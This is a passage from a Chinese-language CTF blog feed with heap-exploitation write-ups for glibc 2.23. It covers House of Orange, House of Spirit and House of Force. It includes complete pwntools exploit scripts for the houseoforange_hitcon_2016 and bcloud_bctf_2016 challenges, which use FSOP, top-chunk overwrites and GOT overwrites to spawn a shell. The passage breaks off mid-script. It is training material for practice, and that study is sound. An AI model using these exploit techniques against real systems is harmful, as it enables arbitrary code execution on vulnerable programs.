return puts("Finish");}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先把前面的写好</p><pre><code># coding=utf-8from pwn import  * context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug binary = './houseoforange_hitcon_2016'  #sh = process(binary) #连接本地程序sh = remote('node4.buuoj.cn',26188) #连接远程程序elf = ELF(binary)     libc = ELF('../../libc-2.23.so--64')  #libc-2.23.so--64one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget[0] = 0x45216s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims  :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content, price='2', color='1'):    ru("Your choice : ")    sl('1')    ru("Length of name :")    sl(str(size))    ru("Name :")    sh.send(content)    ru("Price of Orange:")    sl(str(price))    ru("Color of Orange:")    #1-7    sl(str(color))def show():    ru("Your choice : ")    sl('2')def edit(size, content, price='2', color='1'):    ru("Your choice : ")    sl('3')    ru("Length of name :")    sl(str(size))    ru("Name:")    sh.send(content)    ru("Price of Orange:")    sl(str(price))    ru("Color of Orange:")    #1-7    sl(str(color))</code></pre><h3 id="修改top-chunk"><a href="#修改top-chunk" class="headerlink" title="修改top chunk"></a>修改top chunk</h3><p>随便申请一个chunk，然后利用edit函数，溢出修改topchunk</p><pre><code>add(0x30,'aaaa\n')dbg()payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(2) + p64(0) * 2 + p64(0xf81)edit(len(payload), payload)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>top chunk大小为0x0000000000020f81<br>修改后的top chunk 大小为0x0000000000000f81<br class='item-img' data-src='https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><h3 id="申请大于top-chunk的chunk，进入unsortedbin"><a href="#申请大于top-chunk的chunk，进入unsortedbin" class="headerlink" title="申请大于top chunk的chunk，进入unsortedbin"></a>申请大于top chunk的chunk，进入unsortedbin</h3><pre><code>add(0x1000, 'a\n')dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><h3 id="泄露libc和heap"><a href="#泄露libc和heap" class="headerlink" title="泄露libc和heap"></a>泄露libc和heap</h3><p>调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出</p><pre><code>add(0x400, 'a' * 8)show()ru('a'*8)libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188lg('libc.address',libc.address)io_list_all = libc.symbols['_IO_list_all']system = libc.symbols['system']dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><p>我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址</p><pre><code>payload = 'b' * 0x10edit(0x10, payload)show()ru('b'*0x10)heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))heap_base = heap - 0xE0lg('heap_base',heap_base)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><h3 id="构造fake-file"><a href="#构造fake-file" class="headerlink" title="构造fake_file"></a>构造fake_file</h3><p>接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释</p><p>malloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体</p><pre><code>dbg()payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)fake_file = '/bin/sh\x00'+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,'\x00')fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload)dbg()</code></pre><p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><p>之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell</p><pre><code>ru("Your choice : ")sl('1')itr()</code></pre><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code># coding=utf-8from pwn import  * context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug binary = './houseoforange_hitcon_2016'  #sh = process(binary) #连接本地程序sh = remote('node4.buuoj.cn',26188) #连接远程程序elf = ELF(binary)     libc = ELF('../../libc-2.23.so--64')  #libc-2.23.so--64one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget[0] = 0x45216s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims  :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content, price='2', color='1'):    ru("Your choice : ")    sl('1')    ru("Length of name :")    sl(str(size))    ru("Name :")    sh.send(content)    ru("Price of Orange:")    sl(str(price))    ru("Color of Orange:")    #1-7    sl(str(color))def show():    ru("Your choice : ")    sl('2')def edit(size, content, price='2', color='1'):    ru("Your choice : ")    sl('3')    ru("Length of name :")    sl(str(size))    ru("Name:")    sh.send(content)    ru("Price of Orange:")    sl(str(price))    ru("Color of Orange:")    #1-7    sl(str(color))add(0x30,'aaaa\n')#dbg()payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81) edit(len(payload), payload)#dbg()add(0x1000, 'a\n')#dbg()add(0x400, 'a' * 8)#dbg()show()ru('a'*8)libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188lg('libc.address',libc.address)  io_list_all = libc.symbols['_IO_list_all']system = libc.symbols['system']payload = 'b' * 0x10 edit(0x10, payload)show()ru('b'*0x10)heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))heap_base = heap - 0xE0lg('heap_base',heap_base)#dbg() payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)fake_file = '/bin/sh\x00'+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,'\x00')fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload)#dbg() ru("Your choice : ")sl('1')itr()</code></pre><p>可能因为本地环境没配好，打不通，在buu上远程可以打通<br class='item-img' data-src='https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><blockquote><p>参考文章<br><a href="https://www.cnblogs.com/LynneHuan/p/14696780.html">houseoforange_hitcon_2016</a><br><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;House-of-orange&quot;&gt;&lt;a href=&quot;#House-of-orange&quot; class=&quot;headerlink&quot; title=&quot;House of orange&quot;&gt;&lt;/a&gt;House of orange&lt;/h1&gt;&lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Spirit</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Spirit/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Spirit/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:39.687Z</updated>
    
    <content type="html"><![CDATA[<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><pre><code>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。fake chunk 地址需要对齐， MALLOC_ALIGN_MASKfake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</code></pre><p>想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。&lt;/p&gt;
&lt;p&gt;要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即&lt;/</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Force2</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Force2/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Force2/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:25.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-Of-Force2"><a href="#House-Of-Force2" class="headerlink" title="House Of Force2"></a>House Of Force2</h1><p>基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。</p><p>如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。</p><p>然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。</p><h3 id="glibc源码："><a href="#glibc源码：" class="headerlink" title="glibc源码："></a>glibc源码：</h3><pre><code>// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size   = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}</code></pre><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk</p><h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><pre><code>int add(){  int result; // eax  int i; // [esp+18h] [ebp-10h]  int v2; // [esp+1Ch] [ebp-Ch]  for ( i = 0; i &lt;= 9 &amp;&amp; heap_array[i]; ++i )    ;  if ( i == 10 )    return puts("Lack of space. Upgrade your account with just $100 :)");  puts("Input the length of the note content:");  v2 = choose();  heap_array[i] = malloc(v2 + 4);  if ( !heap_array[i] )    exit(-1);  dword_804B0A0[i] = v2;  puts("Input the content:");  readd(heap_array[i], v2, 10);  printf("Create success, the id is %d\n", i);  result = i;  dword_804B0E0[i] = 0;  return result;}</code></pre><p>add函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写</p><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><pre><code>int edit(){  unsigned int v1; // [esp+14h] [ebp-14h]  int v2; // [esp+18h] [ebp-10h]  int v3; // [esp+1Ch] [ebp-Ch]  puts("Input the id:");  v1 = choose();  if ( v1 &gt;= 0xA )    return puts("Invalid ID.");  v2 = heap_array[v1];  if ( !v2 )    return puts("Note has been deleted.");  v3 = dword_804B0A0[v1];  dword_804B0E0[v1] = 0;  puts("Input the new content:");  readd(v2, v3, 10);  return puts("Edit success.");}</code></pre><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><pre><code>int delete(){  unsigned int v1; // [esp+18h] [ebp-10h]  void *index; // [esp+1Ch] [ebp-Ch]  puts("Input the id:");  v1 = choose();  if ( v1 &gt;= 0xA )    return puts("Invalid ID.");  index = heap_array[v1];  if ( !index )    return puts("Note has been deleted.");  heap_array[v1] = 0;  dword_804B0A0[v1] = 0;  free(index);  #UAF  return puts("Delete success.");}</code></pre><p>delete函数在释放chunk时存在UAF漏洞</p><h3 id="自定义一个read函数"><a href="#自定义一个read函数" class="headerlink" title="自定义一个read函数"></a>自定义一个read函数</h3><pre><code>int __cdecl readd(int a1, int a2, char a3){  char buf; // [esp+1Bh] [ebp-Dh] BYREF  int i; // [esp+1Ch] [ebp-Ch]  for ( i = 0; i &lt; a2; ++i )  {    if ( read(0, &amp;buf, 1u) &lt;= 0 )      exit(-1);    if ( buf == a3 )      break;    *(a1 + i) = buf;  }  *(i + a1) = 0;  return i;}</code></pre><p>三个参数，a1为要输入的地址，a2为输入大小，a3为截止符</p><h4 id="先把前面的一些东西写好"><a href="#先把前面的一些东西写好" class="headerlink" title="先把前面的一些东西写好"></a>先把前面的一些东西写好</h4><pre><code>from pwn import *from LibcSearcher import *context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))sh = process('./bcloud_bctf_2016')#sh = remote('node4.buuoj.cn',26937)elf = ELF('./bcloud_bctf_2016')def add(size,content):   sla('&gt;&gt;','1')   sla('note content:',str(size))   sa('content:',content) def edit(index,content):   sla('&gt;&gt;','3')   sla('id:',str(index))   sa('content:',content) def delete(index):   sla('&gt;&gt;','4')   sla('id:',str(index))</code></pre><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞<br class='item-img' data-src='https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来</p><pre><code>sa('name:','a'*64)ru('a'*64)heap_addr = u32(r(4)) - 0x8lg('heap_addr',heap_addr)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p>再看另一个函数<br class='item-img' data-src='https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><h3 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h3><pre><code>-0000005C v2 dd ?-00000058 db ? ; undefined-00000057 db ? ; undefined..........-00000016 db ? ; undefined-00000015 db ? ; undefined-00000014 v4 dd ?-00000010 db ? ; undefined-0000000F db ? ; undefined-0000000E db ? ; undefined-0000000D db ? ; undefined</code></pre><p>这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\x00’，如果我们将s填满（b’b’*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b’b’*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）</p><pre><code>sa('Org:','a'*0x40)sla('Host:',p32(0xFFFFFFFF))top_chunk_addr = heap_addr  + 0x48*3 - 0x8lg('top_chunk_addr',(top_chunk_addr))</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p>之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，<br>因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，</p><pre><code>offset = heap_array - （top_chunk_addr +0x8）- 0x8</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p>heap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，<br>之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，</p><pre><code>add(offset,'\n')add(0x18,'\n')</code></pre><p>之后编辑chunk_1来修改heap_array数组</p><pre><code>puts_plt = elf.plt['puts']__libc_start_main_got = elf.got['__libc_start_main']free_got = elf.got['free']edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10) + b'\x00'*0x8)</code></pre><p>此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）</p><pre><code>edit(1,p32(puts_plt) + b'\n')</code></pre><p>此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址</p><pre><code>delete(2)dbg()</code></pre><p>free（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址<br class='item-img' data-src='https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><pre><code>#本地one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')#buu远程#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]#libc = ELF('../../libc-2.23.so--32')libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']onegadget = one_gadget[3] + libc_base</code></pre><p>再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve(“/bin/sh\x00”)，获得shell。</p><pre><code>    delete(1)    itr()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-c"><code class="language-c">from pwn import <span class="token operator">*</span>from LibcSearcher import <span class="token operator">*</span><span class="token function">context</span><span class="token punctuation">(</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span> #小端序，linux系统，<span class="token number">64</span>位架构<span class="token punctuation">,</span>debug#定义gdb调试函数def <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        gdb<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>sh<span class="token punctuation">)</span>        <span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span>#命令简写化s       <span class="token operator">=</span> lambda data               <span class="token punctuation">:</span>sh<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> lambda delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>sh<span class="token punctuation">.</span><span class="token function">sendafter</span><span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> lambda data               <span class="token punctuation">:</span>sh<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> lambda delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>sh<span class="token punctuation">.</span><span class="token function">sendlineafter</span><span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>r       <span class="token operator">=</span> lambda num<span class="token operator">=</span><span class="token number">4096</span>           <span class="token punctuation">:</span>sh<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>ru      <span class="token operator">=</span> lambda delims<span class="token punctuation">,</span> drop<span class="token operator">=</span>True  <span class="token punctuation">:</span>sh<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>itr     <span class="token operator">=</span> lambda                    <span class="token punctuation">:</span>sh<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>uu32    <span class="token operator">=</span> lambda data               <span class="token punctuation">:</span><span class="token function">u32</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">ljust</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> lambda data               <span class="token punctuation">:</span><span class="token function">u64</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">ljust</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>leak    <span class="token operator">=</span> lambda name<span class="token punctuation">,</span>addr          <span class="token punctuation">:</span>log<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token string">'{} = {:#x}'</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg      <span class="token operator">=</span> lambda address<span class="token punctuation">,</span>data       <span class="token punctuation">:</span>log<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token string">'%s: '</span><span class="token operator">%</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token string">'./bcloud_bctf_2016'</span><span class="token punctuation">)</span><span class="token macro property">#sh = remote('node4.buuoj.cn',26937)</span>elf <span class="token operator">=</span> <span class="token function">ELF</span><span class="token punctuation">(</span><span class="token string">'./bcloud_bctf_2016'</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>__libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span 